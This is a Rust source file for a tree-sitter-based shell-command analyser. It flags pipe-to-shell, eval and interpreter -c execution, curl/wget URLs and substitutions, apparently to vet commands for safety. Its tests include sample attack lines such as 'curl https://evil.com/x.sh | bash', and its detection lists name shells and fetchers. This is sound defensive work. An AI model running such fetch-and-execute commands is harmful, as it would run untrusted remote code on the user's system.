mod context;
mod powershell;

pub use context::matches_context;
pub use powershell::{is_powershell_command, parse_powershell};

use std::collections::HashSet;

use serde::{Deserialize, Serialize};
use streaming_iterator::StreamingIterator;
use thiserror::Error;
use tree_sitter::{Node, Parser, Query, QueryCursor};

#[derive(Debug, Error)]
pub enum AstError {
    #[error("failed to set bash grammar: {0}")]
    Grammar(String),
    #[error("parse failed")]
    ParseFailed,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ShellDialect {
    #[default]
    Bash,
    PowerShell,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RedirectTarget {
    pub path: String,
    pub operator: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CommandIr {
    pub pipelines: Vec<Pipeline>,
    pub has_command_substitution: bool,
    pub has_heredoc: bool,
    pub has_process_substitution: bool,
    pub has_brace_expansion: bool,
    pub has_arithmetic_expansion: bool,
    pub shell_dialect: ShellDialect,
    pub obfuscation_hint: bool,
    pub indirect_executors: Vec<String>,
    pub external_urls: Vec<String>,
    pub pipe_to_shell: bool,
    pub substitution_bodies: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Pipeline {
    pub commands: Vec<CommandNode>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CommandNode {
    pub name: String,
    pub args: Vec<String>,
    pub flags: Vec<String>,
    pub redirects: Vec<RedirectTarget>,
}

pub struct CommandParser {
    bash: BashParser,
}

impl Default for CommandParser {
    fn default() -> Self {
        Self {
            bash: BashParser::new().expect("bash grammar"),
        }
    }
}

impl CommandParser {
    pub fn new() -> Result<Self, AstError> {
        Ok(Self {
            bash: BashParser::new()?,
        })
    }

    pub fn parse(&mut self, source: &str) -> Result<CommandIr, AstError> {
        if is_powershell_command(source) {
            return Ok(parse_powershell(source));
        }
        self.bash.parse(source)
    }
}

pub fn parse_command(source: &str) -> Result<CommandIr, AstError> {
    CommandParser::new()?.parse(source)
}

pub fn extract_commands(ir: &CommandIr) -> Vec<CommandNode> {
    ir.pipelines
        .iter()
        .flat_map(|p| p.commands.clone())
        .collect()
}

pub struct BashParser {
    parser: Parser,
}

impl BashParser {
    pub fn new() -> Result<Self, AstError> {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_bash::LANGUAGE.into())
            .map_err(|e| AstError::Grammar(e.to_string()))?;
        Ok(Self { parser })
    }

    pub fn parse(&mut self, source: &str) -> Result<CommandIr, AstError> {
        let tree = self
            .parser
            .parse(source, None)
            .ok_or(AstError::ParseFailed)?;
        let root = tree.root_node();
        Ok(build_ir(source, &root))
    }
}

fn build_ir(source: &str, root: &Node) -> CommandIr {
    let mut ir = CommandIr {
        shell_dialect: ShellDialect::Bash,
        ..CommandIr::default()
    };
    let mut current_pipeline = Pipeline::default();

    walk_node(source, *root, &mut ir, &mut current_pipeline);

    if !current_pipeline.commands.is_empty() {
        ir.pipelines.push(current_pipeline);
    }

    detect_pipe_to_shell(&mut ir);
    ir
}

fn walk_node(source: &str, node: Node, ir: &mut CommandIr, pipeline: &mut Pipeline) {
    match node.kind() {
        "pipeline" => {
            let mut inner = Pipeline::default();
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, &mut inner);
            }
            if !inner.commands.is_empty() {
                ir.pipelines.push(inner);
            }
        }
        "redirected_statement" => {
            let mut redirects = Vec::new();
            let mut inner_cmd: Option<Node> = None;
            for child in node.children(&mut node.walk()) {
                match child.kind() {
                    "file_redirect" | "heredoc_redirect" | "herestring_redirect" => {
                        if let Some(rt) = extract_redirect(source, &child) {
                            ir.has_heredoc |= child.kind().contains("heredoc")
                                || child.kind().contains("herestring");
                            redirects.push(rt);
                        }
                    }
                    "command" | "declaration_command" => inner_cmd = Some(child),
                    _ => {}
                }
            }
            if let Some(cmd_node) = inner_cmd {
                if let Some(mut cmd) = extract_command(source, &cmd_node, ir) {
                    cmd.redirects.extend(redirects);
                    pipeline.commands.push(cmd);
                }
            }
        }
        "command" | "declaration_command" => {
            if let Some(cmd) = extract_command(source, &node, ir) {
                pipeline.commands.push(cmd);
            }
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, pipeline);
            }
        }
        "command_substitution" => {
            ir.has_command_substitution = true;
            ir.substitution_bodies.push(node_text(source, &node));
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, pipeline);
            }
        }
        "process_substitution" => {
            ir.has_process_substitution = true;
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, pipeline);
            }
        }
        "arithmetic_expansion" => {
            ir.has_arithmetic_expansion = true;
        }
        "brace_expansion" => {
            ir.has_brace_expansion = true;
        }
        "heredoc_body" | "heredoc_redirect" | "herestring_redirect" => {
            ir.has_heredoc = true;
        }
        _ => {
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, pipeline);
            }
        }
    }
}

fn extract_redirect(source: &str, node: &Node) -> Option<RedirectTarget> {
    let text = node_text(source, node);
    let operator = text
        .chars()
        .take_while(|c| *c == '>' || *c == '<' || *c == '&')
        .collect::<String>();
    let path = text.trim_start_matches(['>', '<', '&', ' ']).to_string();
    if path.is_empty() {
        return None;
    }
    Some(RedirectTarget { path, operator })
}

fn extract_command(source: &str, node: &Node, ir: &mut CommandIr) -> Option<CommandNode> {
    let mut name = String::new();
    let mut args = Vec::new();
    let mut flags = Vec::new();

    for child in node.children(&mut node.walk()) {
        match child.kind() {
            "command_name" | "declaration_command" => {
                if name.is_empty() {
                    name = node_text(source, &child);
                }
            }
            "word" | "string" | "raw_string" | "concatenation" => {
                let text = node_text(source, &child);
                if name.is_empty() {
                    name = text;
                } else {
                    if text.starts_with('-') {
                        flags.push(text.clone());
                    }
                    args.push(text);
                }
            }
            _ => {}
        }
    }

    if name.is_empty() {
        return None;
    }

    annotate_command_metadata(&name, &args, ir);

    Some(CommandNode {
        name,
        args,
        flags,
        redirects: Vec::new(),
    })
}

fn annotate_command_metadata(name: &str, args: &[String], ir: &mut CommandIr) {
    let indirect = ["eval", "source", ".", "exec", "bash", "sh", "zsh", "dash"];
    if indirect.contains(&name) {
        ir.indirect_executors.push(name.to_string());
    }

    if matches!(name, "python" | "python3" | "node" | "perl" | "ruby")
        && args.iter().any(|a| a == "-c" || a == "-e")
    {
        ir.indirect_executors.push(format!("{name} -c"));
    }

    if matches!(name, "curl" | "wget" | "fetch") {
        for arg in args {
            if arg.starts_with("http://") || arg.starts_with("https://") {
                ir.external_urls.push(arg.clone());
            }
        }
    }
}

fn node_text(source: &str, node: &Node) -> String {
    source[node.start_byte()..node.end_byte()].to_string()
}

fn detect_pipe_to_shell(ir: &mut CommandIr) {
    let shells: HashSet<&str> = ["bash", "sh", "zsh", "dash", "fish"].into_iter().collect();
    for pipeline in &ir.pipelines {
        let cmds: Vec<&str> = pipeline.commands.iter().map(|c| c.name.as_str()).collect();
        if cmds.len() < 2 {
            continue;
        }
        let last = cmds.last().copied().unwrap_or_default();
        if shells.contains(last) {
            let fetchers = ["curl", "wget", "cat", "echo", "base64"];
            if cmds.iter().any(|c| fetchers.contains(c)) {
                ir.pipe_to_shell = true;
            }
        }
    }
}

pub fn match_patterns(source: &str, queries: &[&str]) -> Vec<String> {
    let mut parser = match BashParser::new() {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    let tree = match parser.parser.parse(source, None) {
        Some(t) => t,
        None => return Vec::new(),
    };

    let mut matched = Vec::new();
    for (i, query_src) in queries.iter().enumerate() {
        if let Ok(query) = Query::new(&tree_sitter_bash::LANGUAGE.into(), query_src) {
            let mut cursor = QueryCursor::new();
            let mut matches = cursor.matches(&query, tree.root_node(), source.as_bytes());
            if matches.next().is_some() {
                matched.push(format!("query-{i}"));
            }
        }
    }
    matched
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_simple_command() {
        let ir = parse_command("ls -la").unwrap();
        assert_eq!(ir.pipelines.len(), 1);
        assert_eq!(ir.pipelines[0].commands[0].name, "ls");
    }

    #[test]
    fn detects_pipe_to_shell() {
        let ir = parse_command("curl https://evil.com/x.sh | bash").unwrap();
        assert!(ir.pipe_to_shell);
        assert!(!ir.external_urls.is_empty());
    }

    #[test]
    fn detects_process_substitution() {
        let ir = parse_command("cat <(curl evil.com)").unwrap();
        assert!(ir.has_process_substitution);
    }

    #[test]
    fn detects_command_substitution() {
        let ir = parse_command("echo $(whoami)").unwrap();
        assert!(ir.has_command_substitution);
        assert!(!ir.substitution_bodies.is_empty());
    }

    #[test]
    fn extract_commands_flatten() {
        let ir = parse_command("ls | grep foo").unwrap();
        assert_eq!(extract_commands(&ir).len(), 2);
    }

    #[test]
    fn powershell_routing() {
        let ir = parse_command("Invoke-Expression $x").unwrap();
        assert_eq!(ir.shell_dialect, ShellDialect::PowerShell);
    }
}
